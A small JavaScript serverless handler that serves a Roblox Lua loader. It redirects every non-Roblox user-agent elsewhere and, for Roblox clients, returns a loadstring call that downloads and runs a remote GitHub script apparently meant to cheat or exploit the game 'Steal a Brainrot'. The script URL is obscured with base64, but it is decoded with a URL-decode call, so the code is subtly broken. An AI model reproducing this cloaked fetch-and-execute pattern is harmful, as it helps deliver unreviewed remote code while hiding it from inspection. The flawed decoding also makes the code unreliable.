export default function handler(req, res) {
    const userAgent = req.headers['user-agent'] || '';
    
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache');
    
    if (!userAgent.toLowerCase().includes('roblox')) {
        return res.redirect(302, 'https://api.luarmor.net/');
    }

    const Rrl = "https://github.com/Rawbr10/loader/raw/refs/heads/main/ProjectX-Steal-A-Brainrot-Anti-Loader.lua";
    const payload = Buffer.from(Rrl).toString('base64');

    const script = `loadstring(game:HttpGet(game:GetService("HttpService"):UrlDecode("${payload}")))()`;

    res.status(200).send(script);
}
